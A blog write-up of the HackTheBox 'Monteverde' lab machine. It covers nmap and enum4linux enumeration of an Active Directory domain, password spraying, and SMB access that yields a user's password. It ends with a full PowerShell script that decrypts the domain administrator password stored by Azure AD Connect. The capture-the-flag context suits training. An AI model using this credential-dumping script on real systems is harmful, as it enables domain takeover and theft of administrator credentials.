---
date: 2020-06-13 23:48:05
layout: post
title: HackTheBox Monteverde Writeup
subtitle: Hackthebox Monteverde Writeup.
description: >-
  in this blog i've explained how to solve Monteverde machine in hackthebox
image: https://i.ibb.co/ypDQGjN/Screenshot-2020-06-12-01-13-09.png
optimized_image: https://i.ibb.co/ypDQGjN/Screenshot-2020-06-12-01-13-09.png
category: hackthebox
tags:
  - hackthebox
  - Monteverde
author: Ahmed Fatouh
paginate: true
---


# []() Methodology

* Nmap scan
* enum users with enum4linux
* bruteforce
* smb enumeration
* Privilege Escalation

# []()Nmap:

**from the nmap scan i found the important ports like LDAP ports >> 389 ,  kerberos-sec >> 88 , so let's go.**

```ruby

nmap -sC -sV -Pn -oN scan.txt 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.68s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-14 23:25:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=5E96525D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -51m08s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-14T23:28:10
|_  start_date: N/A

```

# []() Enum4Linux & Users Enumeration. 

**i used enum4linux in this machine without ldapsearch beacause both of this tools gives me the same result, so let's start.**

* i will enum users to bruteforce the smb credentials beacause there is no way excapt that.

```ruby

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================== 
|    Session Check on 10.10.10.172    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.172 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.172    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.172 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 ========================================= 
|    Share Enumeration on 10.10.10.172    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ==================================================== 
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: Missing required parameter 'digestmod'.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.172    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.

 ======================================================================= 
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 


```

* nice results.

* now i make a list of users. and here is the list:
> smorgan
Administrator
roleary
dgalanos
Administrator
AAD_987d7f2f57d2
mhope
krbtgt
SABatchJobs
svc-ata
svc-bexec
svc-netapp
Guest
>

* i used this list for passwords too.
* let's own the first user.

### []() Owned First User:

1. **shot**

[![Pwned](https://i.ibb.co/GpMmJg7/fisr.png)](https://asciinema.org/a/mlBcHvgzR2n05NrZXchmDtIHN)

> user: SABatchJobs
>
> Password:SABatchJobs

* with this user i can't read the user flag so let's do some enumeration.

* nice!, let's go deep.

# []()SMB Enumeration

* this point was very simple i found the password in the azure file in mhope user dir.

**commands:**

> smbclient -L //10.10.10.172 -U SABatchJobs

> smbclient \\\\10.10.10.172\\users$ -U SABatchJobs

> get **azure.xml**

* **shot**:

[![Pwnwd](https://i.ibb.co/GsWzNFx/azure.png)](https://asciinema.org/a/QmSAfzUd0Dpo2mNb7Tn1x6e5z)

> user: **mhope**
>
> Password: **4n0therD4y@n0th3r$**

* **user flag:**

[![user](https://i.ibb.co/8jkkMYP/seconed.png)](https://asciinema.org/a/T2vAw91zYPl9Z4GiEpmwr2zzQ)

* **cheers!**.

# []() Privilege Escalation

* **this part is the best part in this machine and so funny**

* after some enumeration i found that the user **mhope** is in MEGABANK\Azure Admins group.

```ruby

*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

* first i got some info apout Azure and DCSync >> [Azure](https://blog.xpnsec.com/azuread-connect-for-redteam/)

* then we will use this exploit [Exploit](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1) to dumb the admin password.

* **comands:**

> first download the exploit and put it in evil-winrm folder

> ruby evil-winrm.rb -u mhope -p "4n0therD4y@n0th3r$" -i 10.10.10.172

> upload Azure-ADConnect.ps1

> run the exploit by >> Azure-ADConnect -server 127.0.0.1 -db ADSync

```ruby

[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!

```

> nice !

> or we can do some modification in the exploit and run it command by command and here is the commands.

```ruby

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server = localhost; Database = ADSync;Integrated Security=sspi"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

Write-Host ("[+] Domain:  " + $domain.Domain)

Write-Host ("[+] Username: " + $username.Username
)

Write-Host ("[+]Password: " + $password.Password)
)

```

* look here!

![shot](https://i.ibb.co/m9t841s/admin.gif)

> **Root**

![root](https://i.ibb.co/92DYD0r/root.gif)

> [![Youtube-Video](https://i.ibb.co/ypDQGjN/Screenshot-2020-06-12-01-13-09.png)](https://www.youtube.com/watch?v=1M_SfLxiu8s&t=97s)
>

> **Thanks**

<script src="https://www.hackthebox.eu/badge/103789"></script>


